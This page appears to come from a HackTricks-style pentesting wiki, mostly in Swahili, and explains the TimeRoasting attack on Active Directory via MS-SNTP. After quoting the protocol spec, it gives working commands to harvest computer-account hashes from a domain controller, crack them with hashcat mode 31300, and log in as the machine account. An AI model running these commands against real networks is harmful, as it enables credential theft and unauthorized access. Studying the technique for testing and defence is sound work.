# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting inatumia upanuzi wa zamani wa uthibitishaji wa MS-SNTP. Katika MS-SNTP, client inaweza kutuma ombi la byte 68 linalojumuisha RID yoyote ya akaunti ya kompyuta; domain controller hutumia hash ya NTLM ya akaunti ya kompyuta (MD4) kama ufunguo kuhesabu MAC juu ya jibu na kuirudisha. Washambulizi wanaweza kukusanya MAC hizi za MS-SNTP bila uthibitisho na kuzivunja offline (Hashcat mode 31300) ili kupata nywila za akaunti za kompyuta.

Tazama sehemu 3.1.5.1 "Authentication Request Behavior" na 4 "Protocol Examples" katika spec rasmi ya MS-SNTP kwa maelezo.
![](../../images/Pasted%20image%2020250709114508.png)
When the ExtendedAuthenticatorSupported ADM element is false, the client sends a 68-byte request and embeds the RID in the least significant 31 bits of the Key Identifier subfield of the authenticator.

> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.

From section 4 (Protocol Examples):

> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.

The crypto-checksum inategemea MD5 (tazama 3.2.5.1.1) na inaweza kuvunjwa offline, ikiruhusu the roasting attack.

## Jinsi ya Kushambulia

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Scripts za Timeroasting zilizotengenezwa na Tom Tervoort
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Shambulio la vitendo (bila uthibitisho) na NetExec + Hashcat

- NetExec inaweza kuorodhesha na kukusanya MS-SNTP MACs kwa computer RIDs bila uthibitisho na kuchapisha $sntp-ms$ hashes ziko tayari kwa cracking:
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline kwa Hashcat mode 31300 (MS-SNTP MAC):
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Matini wazi iliyopatikana inalingana na nenosiri la akaunti ya kompyuta. Jaribu moja kwa moja kama akaunti ya mashine ukitumia Kerberos (-k) wakati NTLM imezimwa:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Vidokezo vya uendeshaji
- Hakikisha usawazishaji wa wakati uko sahihi kabla ya Kerberos: `sudo ntpdate <dc_fqdn>`
- Iwapo inahitajika, tengeneza krb5.conf kwa AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Fanya ramani ya RIDs kwa principals baadaye kupitia LDAP/BloodHound mara tu unapopata authenticated foothold.

## Marejeleo

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
